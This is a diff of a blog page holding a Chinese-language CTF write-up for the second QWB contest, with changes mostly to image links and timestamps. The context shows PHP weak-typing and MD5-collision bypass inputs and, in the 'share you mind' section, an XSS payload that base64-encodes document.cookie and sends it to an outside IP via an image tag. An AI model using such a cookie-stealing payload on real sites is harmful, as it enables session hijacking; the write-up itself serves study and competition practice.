@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-04-02 16:08</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:18'>2018-04-02 16:08</time>
         
     </div>
     <div class="article-meta">
@@ -781,18 +783,18 @@
 <h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote>
 <p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
 </blockquote>
-<p>第一关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="http://oy0tigw51.bkt.clouddn.com/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p>
+<p>第一关<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p>
 <pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap
 param2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803252223_324.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803252223_324.png" alt=""></p>
 <blockquote>
 <p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p>
 </blockquote>
 <pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%4
 0%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D
 8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf
-</code></pre><p>##welcome<br>改名.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="http://oy0tigw51.bkt.clouddn.com/201803260104_53.png" alt=""><br>offset 80</p>
-<h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
+</code></pre><p>##welcome<br>改名.jpg<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803260104_53.png" alt=""><br>offset 80</p>
+<h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
 <p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p>
 <p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p>
 <pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);
@@ -909,7 +911,7 @@ for x in range(0b111111111111111111111 \+ 1, -1, -1):
     <p><span>文章字数:</span><span class="post-count">1,190</span></p>
     <p><span>本文作者:</span><a href="javascript:void(0)" title="Mang0">Mang0</a></p>
     <p><span>发布时间:</span>2018-04-02, 16:08:51</p>
-    <p><span>最后更新:</span>2018-10-15, 08:40:51</p>
+    <p><span>最后更新:</span>2018-11-02, 21:52:18</p>
     <span>原始链接:</span><a class="post-url" href="/archives/2ccf6cb2/" title="第二届强网杯-部分wp">http://mang0.me/archives/2ccf6cb2/</a>
     <p>
         <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
